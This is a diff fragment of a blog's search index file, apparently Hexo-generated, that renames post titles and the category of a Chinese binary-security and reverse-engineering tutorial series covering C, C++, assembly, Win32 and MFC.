       <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-13-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E8%AE%B2%E8%A7%A3/</url>
       
@@ -906,7 +925,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -916,7 +935,7 @@
     
     
     <entry>
-      <title>逆向-MFC的程序编写和安全分析（12）</title>
+      <title>MFC的程序编写和安全分析（12）</title>
       <link href="/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-12-MFC%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%92%8C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
       <url>/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-12-MFC%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%92%8C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
       
@@ -925,7 +944,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -935,7 +954,7 @@
     
     
     <entry>
-      <title>逆向-Win32汇编讲解下（11）</title>
+      <title>Win32汇编讲解下（11）</title>
       <link href="/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-11-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
       <url>/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-11-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
       
@@ -944,7 +963,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -954,7 +973,7 @@
     
     
     <entry>
-      <title>逆向-Win32汇编讲解上（10）</title>
+      <title>Win32汇编讲解上（10）</title>
       <link href="/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-10-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
       <url>/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-10-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
       
@@ -963,7 +982,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -973,7 +992,7 @@
     
     
     <entry>
-      <title>逆向-C++语言函数讲解（9）</title>
+      <title>C++语言函数讲解（9）</title>
       <link href="/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-9-C-%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-9-C-%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3/</url>
       
@@ -982,7 +1001,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -992,7 +1011,7 @@
     
     
     <entry>
-      <title>逆向-C++语言基础讲解（8）</title>
+      <title>C++语言基础讲解（8）</title>
       <link href="/2023/05/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-8-C-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-8-C-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/</url>
       
@@ -1001,7 +1020,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1011,7 +1030,7 @@
     
     
     <entry>
-      <title>逆向-C语言语句深入理解（7）</title>
+      <title>C语言语句深入理解（7）</title>
       <link href="/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-7-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
       <url>/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-7-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
       
@@ -1020,7 +1039,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1030,7 +1049,7 @@
     
     
     <entry>
-      <title>逆向-C语言语句讲解（6）</title>
+      <title>C语言语句讲解（6）</title>
       <link href="/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-6-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-6-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E8%AE%B2%E8%A7%A3/</url>
       
@@ -1039,7 +1058,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1062,7 +1081,7 @@
     
     
     <entry>
-      <title>逆向-C语言基础讲解（5）</title>
+      <title>C语言基础讲解（5）</title>
       <link href="/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-5-C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-5-C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/</url>
       
@@ -1071,7 +1090,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1081,7 +1100,7 @@
     
     
     <entry>
-      <title>逆向-实战寻找关键call（4）</title>
+      <title>实战寻找关键call（4）</title>
       <link href="/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-4-%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AEcall/"/>
       <url>/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-4-%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AEcall/</url>
       
@@ -1090,7 +1109,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1100,7 +1119,7 @@
     
     
     <entry>
-      <title>逆向-汇编语言深入讲解（3）</title>
+      <title>汇编语言深入讲解（3）</title>
       <link href="/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-3-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-3-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E8%AE%B2%E8%A7%A3/</url>
       
@@ -1109,7 +1128,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1119,7 +1138,7 @@
     
     
     <entry>
-      <title>逆向-汇编语言讲解（2）</title>
+      <title>汇编语言讲解（2）</title>
       <link href="/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-2-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-2-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AE%B2%E8%A7%A3/</url>
       
@@ -1128,7 +1147,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -1138,7 +1157,7 @@
     
     
     <entry>
-      <title>逆向-编程基础（1）</title>
+      <title>编程基础（1）</title>
       <link href="/2023/05/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-1-%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
       <url>/2023/05/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-1-%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
       
@@ -1147,7 +1166,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
